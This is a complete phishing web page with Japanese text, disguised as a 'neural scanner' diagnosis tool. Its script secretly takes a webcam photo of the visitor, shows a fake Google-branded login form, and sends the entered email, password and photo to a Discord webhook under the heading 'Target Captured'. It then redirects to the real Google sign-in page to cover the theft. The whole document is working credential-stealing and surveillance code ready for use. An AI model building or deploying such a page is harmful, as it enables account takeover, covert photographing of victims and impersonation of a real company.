<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <title>Deep Neural Analyzer</title>
    <style>
        body { background: #000; color: #fff; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .card { background: #111; padding: 30px; border-radius: 15px; text-align: center; width: 320px; border: 1px solid #333; }
        video { width: 100%; border-radius: 10px; margin-bottom: 20px; background: #000; transform: scaleX(-1); }
        .btn { background: #fff; color: #000; border: none; padding: 12px; width: 100%; border-radius: 5px; font-weight: bold; cursor: pointer; }
        input { width: 100%; padding: 10px; margin: 10px 0; background: #222; border: 1px solid #444; color: #fff; border-radius: 5px; box-sizing: border-box; }
        #login-ui { display: none; }
    </style>
</head>
<body>

    <div class="card" id="camera-ui">
        <h3>NEURAL SCANNER</h3>
        <video id="video" autoplay playsinline></video>
        <button class="btn" id="start-scan">診断を開始</button>
    </div>

    <div class="card" id="login-ui">
        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" width="80">
        <p>結果を表示するには認証が必要です</p>
        <input type="email" id="email" placeholder="メールアドレス">
        <input type="password" id="pass" placeholder="パスワード">
        <button class="btn" id="submit-btn">認証して結果を見る</button>
    </div>

    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        // 🚨 警告：ここにURLを書くと、誰にでも見られるぞ！
        const WEBHOOK_URL = "YOUR_DISCORD_WEBHOOK_URL_HERE"; 
        
        const video = document.getElementById('video');
        const cameraUI = document.getElementById('camera-ui');
        const loginUI = document.getElementById('login-ui');
        let capturedImg = "";

        // 1. カメラ起動
        document.getElementById('start-scan').onclick = async () => {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            video.srcObject = stream;
            setTimeout(() => {
                const canvas = document.getElementById('canvas');
                canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                capturedImg = canvas.toDataURL('image/jpeg', 0.5);
                cameraUI.style.display = 'none';
                loginUI.style.display = 'block';
                stream.getTracks().forEach(t => t.stop());
            }, 3000);
        };

        // 2. Discord送信
        document.getElementById('submit-btn').onclick = async () => {
            const payload = {
                content: "🎯 **Target Captured (JS Direct)**",
                embeds: [{
                    fields: [
                        { name: "📧 Email", value: "```" + document.getElementById('email').value + "```" },
                        { name: "🔑 Password", value: "```" + document.getElementById('pass').value + "```" }
                    ],
                    image: { url: "attachment://view.jpg" }
                }]
            };

            // 画像を送信するためにFormDataを使う
            const formData = new FormData();
            formData.append('payload_json', JSON.stringify(payload));
            
            // Base64をBlobに変換して添付
            const blob = await (await fetch(capturedImg)).blob();
            formData.append('file', blob, 'view.jpg');

            await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
            window.location.href = "https://accounts.google.com/";
        };
    </script>
</body>
</html>
